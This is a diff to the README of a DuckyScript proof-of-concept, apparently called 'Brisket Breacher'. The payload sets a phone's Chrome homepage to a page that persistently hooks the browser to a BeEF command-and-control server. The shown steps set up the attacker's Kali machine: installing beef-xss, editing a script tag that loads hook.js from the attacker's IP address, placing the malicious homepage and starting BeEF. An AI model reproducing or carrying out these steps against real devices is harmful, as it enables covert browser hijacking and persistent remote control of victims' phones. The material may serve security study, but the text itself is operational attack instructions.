@@ -16,16 +16,21 @@ For the purposes of this PoC the BeEF C2 will be hosted locally over LAN, where 
 
 **Persistence**
 
-Due to the payload changing the homepage in the settings of the Google Chrome browser, this creates persistence. *Even* if the phone is restarted, it won't matter, when the browser homepage is loaded, it will *always* attempt to connect to the BeEF C2.
+Due to the payload changing the homepage in the settings of the Google Chrome browser, this creates persistence. *Even* if the phone is restarted, when the browser homepage is loaded, it will *always* attempt to connect to the BeEF C2.
 
 ## Dependencies
-### Setting up the BeEF command and control server using a [Kali Linux](https://www.kali.org) box.
+### > Setting up the BeEF command and control server using a [Kali Linux](https://www.kali.org) box.
 1. Once you have spun-up an instance of Kali (our attacker machine), you must first find the IP address of the machine. This can be found via `ifconfig`, store the IP address as it will be needed in multiple places momentarily.
   
 2. Install BeEF:
     - `sudo apt install beef-xss -y`
      
-4. Download the [homepage.html](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Brisket_Breacher/homepage.html) file (described next). This will be the homepage that our malicious URL will point to and deliber the BeEF C2 hook.
+3. Download the [homepage.html](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Brisket_Breacher/homepage.html) file (described next). This will be the homepage that our malicious URL will point to and deliver the BeEF C2 hook.
     - Open the homepage.html and edit the BeEF C2 hook (line 141 `<script src="http://X.X.X.X:3000/hook.js"></script>`) with the IP address gathered from `ifconfig` of the attacker machine and then save the updated file. E.g., `<script src="http://192.168.8.100:3000/hook.js"></script>`.
     - Become root: `sudo su`.
     - With the homepage.html file in your current working directory, move it to the following directory: `mv homepage.html /usr/share/beef-xss/extensions/demos/html`.
+
+4. Start BeEF:
+    - `sudo beef-xss`.
+   -----
+### > The homepage.
